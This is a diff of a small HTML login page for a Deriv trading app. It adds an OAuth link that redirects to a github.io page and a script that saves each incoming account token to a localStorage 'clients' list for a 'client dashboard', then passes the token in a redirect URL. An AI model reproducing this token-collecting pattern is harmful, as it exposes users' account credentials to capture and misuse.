@@ -1,42 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>My Deriv Affiliate App</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 50px;
-      background-color: #f8f9fa;
-    }
-    h2 {
-      color: #333;
-    }
-    a.button {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 15px 25px;
-      font-size: 18px;
-      color: white;
-      background-color: #d32f2f;
-      text-decoration: none;
-      border-radius: 8px;
-    }
-  </style>
+  <title>Login to Deriv</title>
 </head>
 <body>
-  <h2>Welcome to My Deriv Affiliate App</h2>
-  <p>Click below to login or create your Deriv account.</p>
-  
-  <a class="button" href="https://track.deriv.com/_BdWWYCtdLopZl7VyVw174GNd7ZgqdRLk/1/?redirect=https://oauth.deriv.com/oauth2/authorize?app_id=76088&redirect_uri=https://pocketoption-1.github.io/api_server.github.io">
-    Login or Create Deriv Account
-  </a>
+  <h2>Welcome to My Deriv App</h2>
+  <a href="https://oauth.deriv.com/oauth2/authorize?app_id=76088&redirect_uri=https://pocketoption-1.github.io/api_server.github.io/">Login or Create Deriv Account</a>
+  <br><br>
+  <a href="dashboard.html">View Client Dashboard</a>
 
   <script>
     const urlParams = new URLSearchParams(window.location.search);
     const token = urlParams.get('token');
     if (token) {
+      let clients = JSON.parse(localStorage.getItem('clients') || "[]");
+      clients.push({ token: token, timestamp: new Date().toLocaleString() });
+      localStorage.setItem('clients', JSON.stringify(clients));
       window.location.href = "https://app.deriv.com/trader?token=" + token;
     }
   </script>
